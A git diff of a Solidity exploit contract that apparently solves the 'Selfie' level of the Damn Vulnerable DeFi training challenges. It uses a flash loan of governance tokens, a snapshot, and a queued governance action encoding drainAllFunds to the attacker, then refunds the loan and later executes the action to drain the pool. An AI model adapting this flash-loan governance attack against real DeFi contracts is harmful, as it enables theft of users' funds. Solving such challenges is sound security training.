@@ -33,6 +33,7 @@ contract FlashLoanReceiver {
     DamnValuableTokenSnapshot private _dvtSnap;
     ISimpleGovernance private _simpleGovernance;
     ISelfiePool private _selfiePool;
+    uint256 private actionId;
 
     error SenderIsNotSelfiePool();
     error SenderIsNotOwner();
@@ -61,24 +62,27 @@ contract FlashLoanReceiver {
 
     function receiveTokens(address token, uint256 amount) external {
         if (msg.sender != address(_selfiePool)) revert SenderIsNotSelfiePool();
-        // Then you craft the data to rekt the pool
+        // Crafting the data to drain all the pool.
         bytes memory evilPayload = abi.encodeWithSignature(
             "drainAllFunds(address)",
             _attacker
         );
-        // Create a snapshot to ensure snap id increments
+        //Create a snapshot of the governance token while the attacker's contract have 1.5 millions of it
         _dvtSnap.snapshot();
-        // Into its governance
+        // Queue a proposal to drain all funds of the selfiePool contract
+        actionId = _simpleGovernance.queueAction(
+            address(_selfiePool),
+            evilPayload,
+            0
+        );
 
-        _simpleGovernance.queueAction(address(_selfiePool), evilPayload, 0);
-
-        // And you refund the pool
+        // Refunding the pool
         _dvtSnap.transfer(address(_selfiePool), amount);
     }
 
+    // After the action delay of 2 days, drain all the funds by executing the proposal
     function drainAllFunds() external {
         if (msg.sender != _attacker) revert SenderIsNotOwner();
-        //Then you drain all funds
-        _simpleGovernance.executeAction(1);
+        _simpleGovernance.executeAction(actionId);
     }
 }
